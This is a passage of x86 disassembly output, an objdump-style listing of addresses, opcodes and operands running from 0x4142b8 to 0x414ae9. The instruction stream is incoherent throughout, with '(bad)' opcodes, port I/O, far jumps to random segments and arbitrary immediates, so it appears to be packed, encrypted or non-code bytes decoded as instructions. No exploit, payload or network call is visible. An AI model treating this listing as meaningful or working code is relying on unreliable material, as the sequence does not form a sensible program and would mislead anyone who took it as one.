  4142b8:	mul    BYTE PTR [ecx+esi*1-0x695237c0]
  4142bf:	imul   edi,DWORD PTR [ebp-0x58],0x5116a1fb
  4142c6:	pusha  
  4142c7:	sbb    ebx,DWORD PTR [esi-0x75e6bed8]
  4142cd:	mov    DWORD PTR [ebp-0x1d33e82f],ecx
  4142d3:	and    BYTE PTR [esi+0x1d0fc474],0xf2
  4142da:	or     BYTE PTR [eax],dh
  4142dc:	mov    cl,0x7b
  4142de:	scas   al,BYTE PTR es:[edi]
  4142df:	add    BYTE PTR [esi],bl
  4142e1:	ja     0x4142c6
  4142e3:	cdq    
  4142e4:	push   ebx
  4142e5:	cli    
  4142e6:	push   edx
  4142e7:	jns    0x4142d4
  4142e9:	jbe    0x414270
  4142eb:	mov    esp,0xdcbd160e
  4142f0:	aas    
  4142f1:	ds mov edi,0xe432a44a
  4142f7:	fdiv   QWORD PTR [eax+0x6217f381]
  4142fd:	jl     0x4142fc
  4142ff:	mov    esp,0xfd5effdd
  414304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414305:	in     eax,0x8d
  414307:	add    ah,BYTE PTR [edx]
  414309:	jb     0x414336
  41430b:	je     0x4142d3
  41430d:	adc    eax,0xc4e61670
  414312:	mov    al,ds:0xd574c8c4
  414317:	mov    eax,0xd56300f8
  41431c:	mov    ch,0xb9
  41431e:	jno    0x414389
  414320:	out    dx,al
  414321:	adc    al,0xec
  414323:	sub    eax,0xee258493
  414328:	pop    esp
  414329:	outs   dx,BYTE PTR ds:[esi]
  41432a:	pop    ss
  41432b:	iret   
  41432c:	sbb    al,0x83
  41432e:	mov    edx,esp
  414330:	cmp    BYTE PTR [ecx+0x52],al
  414333:	cwde   
  414334:	sbb    eax,0xb81fe9a5
  414339:	cmp    edx,DWORD PTR [esi+0x22]
  41433c:	push   ebp
  41433d:	inc    ebx
  41433e:	sub    al,0x97
  414340:	cli    
  414341:	test   BYTE PTR [edi-0x89b58fb],dl
  414347:	mov    cl,0x5
  414349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434a:	and    DWORD PTR [esi+0x3f],0xf36311f0
  414351:	xor    eax,0x56f90b92
  414356:	jg     0x4143aa
  414358:	add    ecx,esp
  41435a:	ds and eax,0x19654ce
  414360:	and    DWORD PTR [edi-0x1c],esi
  414363:	cmp    al,0xec
  414365:	int3   
  414366:	test   eax,0xbf6f74f9
  41436b:	push   eax
  41436c:	push   ss
  41436d:	cdq    
  41436e:	(bad)  
  41436f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414370:	out    dx,eax
  414371:	lods   eax,DWORD PTR ds:[esi]
  414372:	cld    
  414373:	mov    cs,WORD PTR ds:0xe3e7b9d5
  414379:	in     al,dx
  41437a:	push   edi
  41437b:	adc    esi,DWORD PTR [esi]
  41437d:	retf   0xa118
  414380:	dec    ebx
  414381:	cmp    esi,eax
  414383:	fisubr DWORD PTR [ebp+0x7f]
  414386:	mov    bh,0x7d
  414388:	(bad)  
  414389:	push   es
  41438a:	pop    esp
  41438b:	sbb    esi,edi
  41438d:	or     ebx,esp
  41438f:	iret   
  414390:	jmp    0x41440a
  414392:	inc    eax
  414393:	aam    0x9a
  414395:	xchg   DWORD PTR [ebp+0x7a83c409],ebx
  41439b:	adc    DWORD PTR [ebp+0x27],edi
  41439e:	sti    
  41439f:	push   ebx
  4143a0:	add    DWORD PTR [ebp-0x61827f4a],esi
  4143a6:	xchg   esp,eax
  4143a7:	lea    esp,[edi]
  4143a9:	push   ds
  4143aa:	ror    DWORD PTR [edx+0x4d251d92],1
  4143b0:	aaa    
  4143b1:	inc    ebp
  4143b2:	int3   
  4143b3:	inc    BYTE PTR [ebp-0x4df46386]
  4143b9:	adc    al,0x53
  4143bb:	cmp    eax,0x797b9416
  4143c0:	mov    al,0x58
  4143c2:	push   cs
  4143c3:	cwde   
  4143c4:	mov    al,ds:0x13abb25b
  4143c9:	dec    edx
  4143ca:	mov    ebp,0x4f0f5d19
  4143cf:	sub    ebx,0x6527dd1f
  4143d5:	fisttp DWORD PTR [ebp+ecx*2-0x368dc629]
  4143dc:	jnp    0x4143c6
  4143de:	shl    DWORD PTR [esi-0x45],1
  4143e1:	mov    ebx,0x7241f7d9
  4143e6:	in     eax,0xdf
  4143e8:	arpl   WORD PTR [eax+eiz*2-0x1b],sp
  4143ec:	jmp    0xf4ef:0x35e331f1
  4143f3:	jmp    0xffa3c9d4
  4143f8:	ins    BYTE PTR es:[edi],dx
  4143f9:	adc    DWORD PTR [ebx+0x38],ebp
  4143fc:	mov    ebx,0x2c766532
  414401:	sub    BYTE PTR [ebx],al
  414403:	and    eax,0xdf894566
  414408:	or     eax,0xdec0e7f3
  41440d:	cld    
  41440e:	push   edi
  41440f:	jmp    0xe50e:0x69382f5d
  414416:	call   0xa516:0x24bcd882
  41441d:	pop    edi
  41441e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41441f:	mov    ecx,0x14bd13ae
  414424:	jecxz  0x4143ba
  414426:	aas    
  414427:	jge    0x4143dd
  414429:	sub    BYTE PTR [ecx-0x233f77bd],ah
  41442f:	xor    DWORD PTR [ecx+0x5f],0xffffffb9
  414433:	cwde   
  414434:	pop    edx
  414435:	aaa    
  414436:	push   ss
  414437:	out    0xe,al
  414439:	shr    DWORD PTR [edi-0x37],cl
  41443c:	mov    ch,BYTE PTR [edi-0x44]
  41443f:	cli    
  414440:	jle    0x41448b
  414442:	out    dx,al
  414443:	xor    eax,0xbf42bea0
  414448:	jnp    0x41442e
  41444a:	add    ecx,DWORD PTR [eax]
  41444c:	pop    esp
  41444d:	repz js 0x414478
  414450:	sti    
  414451:	jmp    FWORD PTR [ecx-0x769297d7]
  414457:	or     BYTE PTR [edi+0x5810f351],0xb9
  41445e:	rcr    BYTE PTR [esi+0x4a5ed8d3],1
  414464:	lds    esp,FWORD PTR [ecx+0x778d601d]
  41446a:	inc    esp
  41446b:	mov    BYTE PTR [ebx+edx*2-0x12],bl
  41446f:	adc    eax,0x2b03008b
  414474:	dec    edx
  414475:	stos   BYTE PTR es:[edi],al
  414476:	rol    DWORD PTR [eax+0x2931396d],1
  41447c:	bound  edi,QWORD PTR [edx]
  41447e:	cwde   
  41447f:	shl    ah,0xc5
  414482:	stos   BYTE PTR es:[edi],al
  414483:	aam    0x14
  414485:	clc    
  414486:	pop    eax
  414487:	jne    0x414452
  414489:	sti    
  41448a:	loope  0x41445e
  41448c:	ret    0x9c92
  41448f:	inc    ebx
  414490:	test   BYTE PTR [edi-0x17],al
  414493:	(bad)  [edx]
  414495:	data16 hlt 
  414497:	add    DWORD PTR [ecx+0x75],esi
  41449a:	dec    ebx
  41449b:	sbb    dl,BYTE PTR ds:[ecx+0x10bdd6a3]
  4144a2:	sbb    al,0x41
  4144a4:	in     al,dx
  4144a5:	div    DWORD PTR [ebx-0x18ca0e07]
  4144ab:	imul   esi,DWORD PTR [ecx],0x7e558cf9
  4144b1:	mov    cl,0xb
  4144b3:	repz push edi
  4144b5:	xor    DWORD PTR [ecx+0x7e274d4c],0xd35d19d2
  4144bf:	daa    
  4144c0:	movhps QWORD PTR [eax-0x14773ccb],xmm4
  4144c7:	xor    DWORD PTR [esp+ecx*1-0xc139f66],esp
  4144ce:	sar    BYTE PTR [esp+ecx*4+0x14],0x29
  4144d3:	loope  0x4144f7
  4144d5:	push   esp
  4144d6:	xchg   DWORD PTR [ebx+0x5b],ebx
  4144d9:	jb     0x4144c3
  4144db:	xchg   ecx,eax
  4144dc:	lock fcomi st,st(5)
  4144df:	xchg   BYTE PTR [ebx-0x39],ah
  4144e2:	ret    
  4144e3:	jecxz  0x41451c
  4144e5:	lea    edx,[edx-0x36]
  4144e8:	lods   eax,DWORD PTR ds:[esi]
  4144e9:	or     edi,DWORD PTR [ecx+0x1c0bec71]
  4144ef:	xlat   BYTE PTR ds:[ebx]
  4144f0:	clc    
  4144f1:	mov    ch,0xf8
  4144f3:	mov    cl,0x8
  4144f5:	loop   0x414504
  4144f7:	fild   DWORD PTR [ebx]
  4144f9:	xlat   BYTE PTR ds:[ebx]
  4144fa:	mov    bl,BYTE PTR [eax+eax*4-0x5e]
  4144fe:	xor    bh,BYTE PTR ds:0x8045ed07
  414504:	sub    DWORD PTR fs:[ebx-0x76729961],ecx
  41450b:	xchg   DWORD PTR [edi-0xfab057c],ecx
  414511:	rcl    DWORD PTR [ecx+ebx*2+0x298b7d81],cl
  414518:	mov    cs,esi
  41451a:	idiv   BYTE PTR [ecx]
  41451c:	xor    eax,DWORD PTR [esi-0x74]
  41451f:	or     bl,ch
  414521:	fs repnz fs cli 
  414525:	jo     0x414556
  414527:	xor    ah,al
  414529:	(bad)
  41452c:	inc    esi
  41452d:	or     DWORD PTR [ebx+0x4d221b85],esp
  414533:	lods   al,BYTE PTR ds:[esi]
  414534:	and    edx,DWORD PTR [eax+esi*8+0x29f4402c]
  41453b:	and    al,0x7b
  41453d:	mov    eax,ebp
  41453f:	mov    cl,0xe6
  414541:	xor    eax,0xd39e7015
  414546:	in     al,0xc9
  414548:	mov    edi,0xfbf786bc
  41454d:	cmp    DWORD PTR [edx],0x5c72061c
  414553:	push   es
  414554:	js     0x41450d
  414556:	inc    ecx
  414557:	mov    al,0xa2
  414559:	push   ebp
  41455a:	push   esi
  41455b:	dec    esp
  41455c:	and    esi,DWORD PTR [eax-0x599efa14]
  414562:	arpl   WORD PTR [ebx+0x5135108f],dx
  414568:	push   esp
  414569:	sbb    al,0xc3
  41456b:	scas   eax,DWORD PTR es:[edi]
  41456c:	xlat   BYTE PTR ds:[ebx]
  41456d:	or     DWORD PTR [esi],esp
  41456f:	sub    ch,BYTE PTR [ebp-0x4e5d32a5]
  414575:	sbb    al,0xfd
  414577:	cmp    DWORD PTR [ecx-0x601e5c9c],ebx
  41457d:	(bad)  
  41457f:	jae    0x41452b
  414581:	div    BYTE PTR [esi+0x15e31152]
  414587:	gs loop 0x4145e8
  41458a:	mov    esi,0x9cc66f90
  41458f:	xor    BYTE PTR [edx+0x2f4ed774],0x7a
  414596:	dec    ebp
  414597:	lahf   
  414598:	aad    0x6f
  41459a:	or     DWORD PTR [eax+0x1d2a6be6],edx
  4145a0:	lea    edi,[esi+ebx*4]
  4145a3:	lea    ecx,[edi+esi*4-0x808403a]
  4145aa:	inc    edi
  4145ab:	rcl    DWORD PTR [edi+0x6c0ce0d3],0x30
  4145b2:	mov    DWORD PTR [ecx+0x10fe2e92],edi
  4145b8:	scas   eax,DWORD PTR es:[edi]
  4145b9:	pop    ecx
  4145ba:	in     eax,0x62
  4145bc:	mov    ebp,esi
  4145be:	push   es
  4145bf:	mov    ds:0x57feef5c,eax
  4145c4:	add    cl,BYTE PTR [ebx]
  4145c6:	mov    ebx,0x23634ccd
  4145cb:	mov    edx,0x8e330be4
  4145d0:	push   ecx
  4145d1:	mov    ds:0x88a591fe,al
  4145d6:	jle    0x41458c
  4145d8:	jns    0x414631
  4145da:	rcr    BYTE PTR [ecx+0x4e],0xf3
  4145de:	mov    ebp,0x9cda82c5
  4145e3:	push   ecx
  4145e4:	dec    ebx
  4145e5:	or     eax,0x55b51e6
  4145ea:	cld    
  4145eb:	je     0x414620
  4145ed:	mov    dl,0x89
  4145ef:	popa   
  4145f0:	das    
  4145f1:	retf   0xc009
  4145f4:	mov    al,ds:0xa7035aef
  4145f9:	mov    eax,ds:0x408fd85e
  4145fe:	pop    ds
  4145ff:	idiv   BYTE PTR [ecx+0x636db223]
  414605:	in     eax,dx
  414606:	or     ch,BYTE PTR [ecx]
  414608:	(bad)  
  41460a:	icebp  
  41460b:	lods   eax,DWORD PTR ds:[esi]
  41460c:	ja     0x41466b
  41460e:	inc    ecx
  41460f:	mov    DWORD PTR [ecx-0x146de206],ecx
  414615:	in     al,0xa
  414617:	(bad)  
  414618:	neg    BYTE PTR [eax+0x7c96acef]
  41461e:	inc    esi
  41461f:	loop   0x4145e3
  414621:	mov    cl,0xf0
  414623:	mov    ds:0xdad1a94f,eax
  414628:	int3   
  414629:	mov    edi,0x38fd7a46
  41462e:	arpl   bp,bp
  414630:	jne    0x41460e
  414632:	mov    bh,0x5d
  414634:	adc    DWORD PTR [ebx-0x461be4d3],edx
  41463a:	mov    ds:0x47f7e8e2,eax
  41463f:	ja     0x41462b
  414641:	fistp  QWORD PTR [esi-0x21]
  414644:	fst    QWORD PTR [eax+0x6c103a42]
  41464a:	xor    al,0xc6
  41464c:	and    al,0x6a
  41464e:	pop    eax
  41464f:	mov    ecx,DWORD PTR [ecx+0x32]
  414652:	inc    ecx
  414653:	xor    ebx,ebp
  414655:	lock rcr DWORD PTR [ebx+0x7],cl
  414659:	adc    dh,BYTE PTR [ebp+0x4c]
  41465c:	mov    ds:0xb3a323d9,eax
  414661:	dec    eax
  414662:	cli    
  414663:	cmp    esp,DWORD PTR [esi+0x1c20211b]
  414669:	js     0x414668
  41466b:	rcl    BYTE PTR [edi-0x7c792c38],cl
  414671:	stc    
  414672:	xchg   ecx,eax
  414673:	bound  edi,QWORD PTR [esi+0x11]
  414676:	mov    al,0x85
  414678:	jp     0x414627
  41467a:	in     al,0x16
  41467c:	add    ch,BYTE PTR [edi+0x1b]
  41467f:	das    
  414680:	jo     0x4146c4
  414682:	mov    ch,0x11
  414684:	call   0xf7e2:0xdf0da204
  41468b:	mov    al,ds:0x7ab8cbdb
  414690:	dec    ebp
  414691:	pusha  
  414692:	inc    ecx
  414693:	or     eax,0x8b5cd25a
  414698:	xor    DWORD PTR [edx-0x7a],esp
  41469b:	mov    ds:0x9d8fbda5,eax
  4146a0:	inc    ebx
  4146a1:	sbb    eax,0xda30e1c1
  4146a6:	xor    DWORD PTR [ecx-0x69],ebx
  4146a9:	pop    esp
  4146aa:	shl    DWORD PTR [ebx],cl
  4146ac:	mov    ch,0x3d
  4146ae:	and    eax,0xc3222e48
  4146b3:	mov    ds:0xc5febe57,al
  4146b8:	clc    
  4146b9:	outs   dx,BYTE PTR ds:[esi]
  4146ba:	or     esi,ebp
  4146bc:	sti    
  4146bd:	adc    eax,0x3e30afad
  4146c2:	dec    edi
  4146c3:	jmp    0xe75b:0x84257a29
  4146ca:	jecxz  0x41466a
  4146cc:	cwde   
  4146cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ce:	hlt    
  4146cf:	out    0x30,al
  4146d1:	push   0x6d
  4146d3:	sbb    bh,BYTE PTR [edi]
  4146d5:	push   ss
  4146d6:	push   ebp
  4146d7:	xor    bl,BYTE PTR [ecx]
  4146d9:	(bad)  [bp+si-0x5b97]
  4146de:	test   eax,0xa4506613
  4146e3:	dec    esp
  4146e4:	movzx  ebp,BYTE PTR [edx-0x52b107a3]
  4146eb:	mov    ecx,0x3cd6cc16
  4146f0:	ins    DWORD PTR es:[edi],dx
  4146f1:	adc    ch,BYTE PTR [esi+0x5bd2274f]
  4146f7:	sub    BYTE PTR [esi-0x612227e8],bl
  4146fd:	jbe    0x41474a
  4146ff:	jo     0x414688
  414701:	xor    bh,BYTE PTR [edi-0x19ea70f0]
  414707:	push   ds
  414708:	and    al,0xe2
  41470a:	push   ss
  41470b:	mov    bl,0xfe
  41470d:	repnz cmp BYTE PTR ds:0x134960e1,al
  414714:	sub    ebx,ecx
  414716:	xchg   edi,eax
  414717:	mov    al,ds:0x56f28290
  41471c:	mov    ah,0xb5
  41471e:	out    dx,eax
  41471f:	and    ecx,DWORD PTR [ebx]
  414721:	cmp    eax,0x962c831d
  414726:	fidivr WORD PTR ds:0x169ea9cf
  41472d:	inc    eax
  41472e:	ins    BYTE PTR es:[edi],dx
  41472f:	add    al,bh
  414731:	rol    BYTE PTR [ebp+eax*8+0x7ef2ac6],1
  414738:	pop    esp
  414739:	push   ss
  41473a:	jne    0x41474c
  41473c:	sbb    al,0x2f
  41473e:	mov    WORD PTR es:[ecx],ds
  414741:	adc    eax,0x466c539d
  414746:	mov    bh,BYTE PTR [edi-0x76e068b3]
  41474c:	mov    ecx,0xd0789f1a
  414751:	not    DWORD PTR [esi+0x1e]
  414754:	jno    0x4147af
  414756:	ds or  eax,0xe6697d23
  41475c:	fdiv   DWORD PTR [edx-0x1e]
  41475f:	push   ss
  414760:	sub    eax,0x5568632b
  414765:	pop    es
  414766:	fucomip st,st(0)
  414768:	mov    bh,0xf3
  41476a:	adc    cl,BYTE PTR [edx-0x55]
  41476d:	icebp  
  41476e:	imul   esp,DWORD PTR [ecx-0x65],0x41
  414772:	xchg   ecx,eax
  414773:	add    dl,BYTE PTR [ecx-0x36]
  414776:	pop    ebp
  414777:	ret    0x8394
  41477a:	mov    BYTE PTR [esi],dl
  41477c:	push   cs
  41477d:	inc    ebp
  41477e:	and    esp,DWORD PTR [esi]
  414780:	in     eax,dx
  414781:	push   ds
  414782:	adc    edi,edx
  414784:	sbb    eax,0x5810078b
  414789:	push   eax
  41478a:	retf   0xa815
  41478d:	or     esi,DWORD PTR [edx+0x1988d143]
  414793:	out    dx,eax
  414794:	add    cl,BYTE PTR [eax-0xb]
  414797:	or     edx,DWORD PTR [edx]
  414799:	add    BYTE PTR [edx],bl
  41479b:	data16 (bad) 
  41479e:	inc    edx
  41479f:	jmp    0xd9e9:0xa3784f4c
  4147a6:	dec    edx
  4147a7:	jbe    0x414803
  4147a9:	dec    esp
  4147aa:	mov    edi,gs
  4147ac:	repz push eax
  4147ae:	and    bh,BYTE PTR [ecx+ebx*1+0x498aa7d0]
  4147b5:	es mov ch,0xef
  4147b8:	(bad)  
  4147b9:	add    BYTE PTR gs:[esi-0x50e3fe16],0xa5
  4147c1:	stc    
  4147c2:	pop    es
  4147c3:	sbb    ah,BYTE PTR ds:0xd1143543
  4147c9:	mov    ch,0xc4
  4147cb:	jle    0x414792
  4147cd:	pop    ebp
  4147ce:	or     cl,bl
  4147d0:	arpl   dx,sp
  4147d2:	xchg   edx,eax
  4147d3:	ret    0x86a1
  4147d6:	or     al,0x21
  4147d8:	jno    0x41484d
  4147da:	stos   DWORD PTR es:[edi],eax
  4147db:	mov    cl,0x58
  4147dd:	mov    ah,cl
  4147df:	repz cs aas 
  4147e2:	xor    BYTE PTR [edi+0x62],bh
  4147e5:	loopne 0x414776
  4147e7:	std    
  4147e8:	test   BYTE PTR [edx],ah
  4147ea:	pop    ecx
  4147eb:	push   esp
  4147ec:	mov    eax,DWORD PTR [eax-0x6d]
  4147ef:	sbb    DWORD PTR [edx+0x24a54e47],edi
  4147f5:	inc    eax
  4147f6:	ror    BYTE PTR [eax+ebx*2-0x6cefb1d6],1
  4147fd:	out    0xec,al
  4147ff:	rcl    BYTE PTR [edi],cl
  414801:	daa    
  414802:	das    
  414803:	push   edx
  414804:	and    esi,edi
  414806:	mov    dl,0x8a
  414808:	pop    ecx
  414809:	add    al,0xbf
  41480b:	aad    0x47
  41480d:	sub    esp,DWORD PTR ds:0xa4bc4063
  414813:	rcl    DWORD PTR [edi-0xbd3bd9b],cl
  414819:	test   DWORD PTR [ebx+0x6954675a],edi
  41481f:	sub    edx,DWORD PTR [esi+0x63148379]
  414825:	cmp    ecx,DWORD PTR [ebp-0x2a]
  414828:	xchg   BYTE PTR [edi],bl
  41482a:	stos   BYTE PTR es:[edi],al
  41482b:	xchg   DWORD PTR [edi],ecx
  41482d:	out    0x7b,al
  41482f:	pop    esp
  414830:	inc    ebx
  414831:	mov    edi,0x517a4b54
  414836:	xlat   BYTE PTR ds:[ebx]
  414837:	cld    
  414838:	rcr    bl,1
  41483a:	add    eax,0xac35bb28
  41483f:	cmp    al,0xba
  414841:	pop    esp
  414842:	imul   ecx,DWORD PTR [ecx+0x5d],0x4f
  414846:	fild   DWORD PTR [ecx-0x6bd114e1]
  41484c:	aas    
  41484d:	sub    al,0x95
  41484f:	push   edx
  414850:	aaa    
  414851:	add    BYTE PTR [bx+si],bl
  414854:	sub    ebp,ebp
  414856:	pop    esp
  414857:	mov    al,ds:0x7727e830
  41485c:	int3   
  41485d:	jg     0x414869
  41485f:	stos   BYTE PTR es:[edi],al
  414860:	or     al,0x63
  414862:	mov    al,BYTE PTR [ebx-0x78]
  414865:	adc    cl,dh
  414867:	(bad)  
  414869:	jnp    0x41480d
  41486b:	push   ds
  41486c:	xor    al,0x7b
  41486e:	out    0x6e,al
  414870:	adc    al,0x1f
  414872:	xor    al,0x3b
  414874:	add    ah,BYTE PTR [edi+ebx*2+0x7f338e9]
  41487b:	pmulhw mm2,QWORD PTR [edx]
  41487e:	pop    ss
  41487f:	in     eax,0x2
  414881:	movups xmm6,xmm4
  414884:	adc    eax,0xb34a0242
  414889:	fistp  WORD PTR [ebx-0x3a7e06ac]
  41488f:	fsubrp st(0),st
  414891:	sub    BYTE PTR [eax],dl
  414893:	fiadd  WORD PTR [edx+0xa]
  414896:	push   ebp
  414897:	dec    esp
  414898:	sub    eax,0x3b70b1ab
  41489d:	sub    eax,0x9b2d278b
  4148a2:	cmp    ch,al
  4148a4:	mov    ecx,0x70cb57d7
  4148a9:	les    esi,FWORD PTR [edx]
  4148ab:	mov    ch,0xd
  4148ad:	les    ebp,FWORD PTR [esi-0x5e78efff]
  4148b3:	mov    ds:0x634fe534,al
  4148b8:	inc    ebx
  4148b9:	cmc    
  4148ba:	imul   ecx,DWORD PTR [esi+0x7a],0xd00c59f1
  4148c1:	jbe    0x41491b
  4148c3:	pop    ss
  4148c4:	push   edx
  4148c5:	data16 sub dl,cl
  4148c8:	pusha  
  4148c9:	add    eax,0xe1511387
  4148ce:	pop    ds
  4148cf:	clc    
  4148d0:	adc    BYTE PTR [edi+0x40],al
  4148d3:	push   ecx
  4148d4:	mov    cl,0xba
  4148d6:	and    ebx,DWORD PTR [esi]
  4148d8:	adc    eax,0x9ffd9857
  4148dd:	xor    eax,ebx
  4148df:	cmp    edi,DWORD PTR ds:0xaacdd46f
  4148e5:	jae    0x41488b
  4148e7:	outs   dx,BYTE PTR ds:[esi]
  4148e8:	outs   dx,BYTE PTR ds:[esi]
  4148e9:	add    al,0x34
  4148eb:	aaa    
  4148ec:	ror    DWORD PTR [esi],1
  4148ee:	(bad)  
  4148ef:	aas    
  4148f0:	pop    eax
  4148f1:	adc    ah,BYTE PTR [ebx+ebp*4-0x258d3728]
  4148f8:	sbb    dl,BYTE PTR [edx-0x1b7c07da]
  4148fe:	popa   
  4148ff:	in     eax,dx
  414900:	mov    WORD PTR [esi],?
  414902:	jmp    0x414928
  414904:	xchg   esp,eax
  414905:	xor    eax,0x6263e976
  41490a:	(bad)  [edx+0x7]
  41490d:	stc    
  41490e:	scas   eax,DWORD PTR es:[edi]
  41490f:	mov    cl,0xf3
  414911:	jno    0x41495a
  414913:	push   eax
  414914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414915:	or     esp,ebx
  414917:	push   edx
  414918:	mov    dh,0xbf
  41491a:	icebp  
  41491b:	and    DWORD PTR [eax+0x68],ebx
  41491e:	shl    BYTE PTR ds:0x185ed59d,1
  414924:	cwde   
  414925:	(bad)  [esi+0x18717842]
  41492b:	add    esp,edi
  41492d:	ds add ebp,edx
  414930:	inc    eax
  414931:	out    0x97,eax
  414933:	ins    BYTE PTR es:[edi],dx
  414934:	adc    eax,0xba45d4f7
  414939:	xlat   BYTE PTR ds:[ebx]
  41493a:	xchg   edi,eax
  41493b:	pop    ss
  41493c:	rol    DWORD PTR [esi],0x87
  41493f:	loop   0x414963
  414941:	push   ebp
  414942:	test   DWORD PTR [eax-0x623d4051],edx
  414948:	fsubr  st(4),st
  41494a:	sbb    bl,BYTE PTR [ebx+0x7ad2da92]
  414950:	cld    
  414951:	sbb    BYTE PTR [eax-0x7d],bh
  414954:	mov    ebx,0xe992922e
  414959:	rcl    BYTE PTR [ebx-0x47],cl
  41495c:	mov    ch,0x7e
  41495e:	jb     0x4149c4
  414960:	clc    
  414961:	jl     0x414958
  414963:	and    BYTE PTR [edx+0x7ca92989],ah
  414969:	cmp    al,0xe4
  41496b:	fisubr WORD PTR [esi+0x18829429]
  414971:	jnp    0x4149cb
  414973:	mov    al,ds:0xb28dcd11
  414978:	aad    0xaf
  41497a:	xchg   esp,eax
  41497b:	or     eax,esp
  41497d:	push   ss
  41497e:	sti    
  41497f:	iret   
  414980:	dec    eax
  414981:	dec    ebx
  414982:	and    eax,0xed1ef28c
  414987:	xchg   edi,eax
  414988:	xor    eax,DWORD PTR [eax+0x45]
  41498b:	xor    cl,0x6e
  41498e:	pop    edx
  41498f:	loope  0x414960
  414991:	(bad)  
  414992:	in     eax,dx
  414993:	cwde   
  414994:	popa   
  414995:	nop
  414996:	add    ebx,eax
  414998:	repz mov ebx,DWORD PTR [ebp+0x34]
  41499c:	in     eax,dx
  41499d:	jbe    0x4149e7
  41499f:	lods   eax,DWORD PTR ds:[esi]
  4149a0:	jae    0x4149b6
  4149a2:	(bad)  
  4149a3:	xchg   ebp,eax
  4149a4:	xor    eax,0xe1bf88a6
  4149a9:	xchg   edx,eax
  4149aa:	gs ja  0x41496e
  4149ad:	jecxz  0x414994
  4149af:	stc    
  4149b0:	out    dx,al
  4149b1:	sbb    esi,DWORD PTR [edx-0x5f]
  4149b4:	dec    esi
  4149b5:	jle    0x41496e
  4149b7:	mov    bl,0xa3
  4149b9:	mov    dl,BYTE PTR [ebx]
  4149bb:	stos   DWORD PTR es:[edi],eax
  4149bc:	mov    dl,0x74
  4149be:	outs   dx,DWORD PTR ds:[esi]
  4149bf:	xor    ebx,DWORD PTR [esi]
  4149c1:	mov    DWORD PTR [ecx-0x1bb07f50],esi
  4149c7:	push   0x1
  4149c9:	in     al,0x56
  4149cb:	daa    
  4149cc:	shl    bh,0xb3
  4149cf:	call   0xfc7c:0xde4c61d3
  4149d6:	fs ins BYTE PTR es:[edi],dx
  4149d8:	aaa    
  4149d9:	lods   al,BYTE PTR ds:[esi]
  4149da:	mov    esp,0x4dfca6e6
  4149df:	xor    edi,DWORD PTR [edx-0x5458a697]
  4149e5:	mov    ebx,ecx
  4149e7:	push   edi
  4149e8:	lea    esi,[edx-0x49]
  4149eb:	cmp    dl,al
  4149ed:	shr    esp,0xa2
  4149f0:	adc    DWORD PTR [esi-0x3a21203b],edi
  4149f6:	ret    
  4149f7:	mov    WORD PTR [ecx+eax*2],es
  4149fa:	dec    ebx
  4149fb:	(bad)  
  4149fc:	hlt    
  4149fd:	hlt    
  4149fe:	push   cs
  4149ff:	push   ebx
  414a00:	and    BYTE PTR [ebp+0x32ccf58c],bl
  414a06:	test   DWORD PTR [ebx+0x30],esi
  414a09:	in     eax,0x31
  414a0b:	js     0x414a5d
  414a0d:	fisub  DWORD PTR [esi+ebp*1]
  414a10:	outs   dx,DWORD PTR ds:[esi]
  414a11:	bound  edx,QWORD PTR [edi]
  414a13:	push   edi
  414a14:	mov    ebx,0x14f1757d
  414a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1a:	sub    DWORD PTR ds:0x4d0ea1c6,ebx
  414a20:	jle    0x414a3e
  414a22:	push   edx
  414a23:	sub    esp,0x4b
  414a26:	cld    
  414a27:	ret    0xa3a
  414a2a:	and    DWORD PTR [edi+0x61c0a162],ebp
  414a30:	jp     0x4149f8
  414a32:	aaa    
  414a33:	scas   al,BYTE PTR es:[edi]
  414a34:	sub    ch,BYTE PTR [ebx-0xc0e013c]
  414a3a:	das    
  414a3b:	test   al,0x90
  414a3d:	pusha  
  414a3e:	test   al,dh
  414a40:	pusha  
  414a41:	pop    ebp
  414a42:	mov    edi,0x84d549f7
  414a47:	or     eax,0xf1c021ec
  414a4c:	test   eax,0x86ea881a
  414a51:	jnp    0x414a6a
  414a53:	loope  0x414ab6
  414a55:	pop    esi
  414a56:	jmp    0xe259:0xa06a0448
  414a5d:	loope  0x414aab
  414a5f:	retf   
  414a60:	inc    ecx
  414a61:	stc    
  414a62:	sub    edx,DWORD PTR [ebp-0x38]
  414a65:	ja     0x414a82
  414a67:	test   eax,0xad59fbe8
  414a6c:	je     0x414a24
  414a6e:	sbb    al,0x41
  414a70:	sahf   
  414a71:	arpl   sp,bp
  414a73:	popa   
  414a74:	cmp    eax,0x9127c5f9
  414a79:	retf   0xd2ed
  414a7c:	pop    ss
  414a7d:	out    dx,eax
  414a7e:	inc    ebp
  414a7f:	ja     0x414a72
  414a81:	push   0xa381ba0c
  414a86:	dec    ecx
  414a87:	inc    ebp
  414a88:	out    0x79,al
  414a8a:	push   ecx
  414a8b:	pop    ds
  414a8c:	push   es
  414a8d:	outs   dx,DWORD PTR ds:[esi]
  414a8e:	repz cmp DWORD PTR [esi+eax*8-0xf57e365],esp
  414a96:	jmp    0x8c143110
  414a9b:	std    
  414a9c:	sbb    BYTE PTR [edx-0x599fba0b],al
  414aa2:	adc    BYTE PTR [ecx],0x5
  414aa5:	(bad)  
  414aa6:	pop    ebx
  414aa7:	mov    edi,0xec9805ae
  414aac:	add    dh,BYTE PTR [esi+0x63]
  414aaf:	sbb    esi,DWORD PTR [edi-0x19]
  414ab2:	xchg   esi,eax
  414ab3:	fmul   QWORD PTR [edx-0x1dcd005b]
  414ab9:	push   ecx
  414aba:	dec    esp
  414abb:	in     al,0x7d
  414abd:	sub    DWORD PTR [eax+0x1f490025],esp
  414ac3:	add    al,ch
  414ac5:	xor    esp,DWORD PTR [edi]
  414ac7:	shl    BYTE PTR [edi],1
  414ac9:	add    BYTE PTR [ecx-0x109bc0bf],bh
  414acf:	add    BYTE PTR [edi+0x6],ch
  414ad2:	scas   al,BYTE PTR es:[edi]
  414ad3:	shl    ebp,0x8e
  414ad6:	pushf  
  414ad7:	or     esi,DWORD PTR [eax+0x44]
  414ada:	inc    ecx
  414adb:	imul   ecx,eax,0xd393aeb6
  414ae1:	(bad)  [edi]
  414ae3:	call   0x1a9ddf5f
  414ae8:	inc    edi
  414ae9:	cs cdq 
